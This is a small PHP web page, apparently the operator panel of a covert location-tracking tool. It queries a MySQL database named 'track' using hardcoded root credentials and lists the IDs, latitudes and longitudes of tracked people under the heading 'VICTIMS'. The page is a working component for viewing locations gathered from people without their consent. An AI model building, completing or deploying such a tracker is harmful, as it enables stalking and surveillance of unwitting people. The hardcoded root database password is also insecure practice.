<html>
    <style>
        body{
            background-image: url("https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2018/03/screener_1521017380872-796x419.jpg");
            background-repeat: no-repeat;
            background-size:cover;
            font-size:1vh;
            background-position: center; 

        }
    </style>
<head>
    <title>Victims</title>
    <link href="https://fonts.googleapis.com/css?family=Space+Mono" rel="stylesheet">
</head>    
<body topmargin="20%"> 
 
    <div style="font-family: 'Space Mono', monospace; background-color:#666666; margin: auto;
  width: 50%;
  border: 3px solid BLACK;
  padding: 10px;
  border-radius:30px">
 <div style="font-size:30px;font-weight:700;"><center>VICTIMS</center></div>
<?php
$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "track";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT id, lat, lon FROM users";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // output data of each row
    echo "<table cellspacing=10px cellpadding=10px><tr><th>ID</th><th>LATITUDE</th><th>LONGITUDE</th></tr>";  
    while ($row = $result->fetch_assoc()) {
        echo "<tr>" ."<td>". $row["id"] ."</td><td>". $row["lat"] . "</td><td>" . $row["lon"] . "</td></tr>";
    }
    echo "</table>";
} else {
    echo "0 results";
}
$conn->close();
?>


</div>

</body>
</html>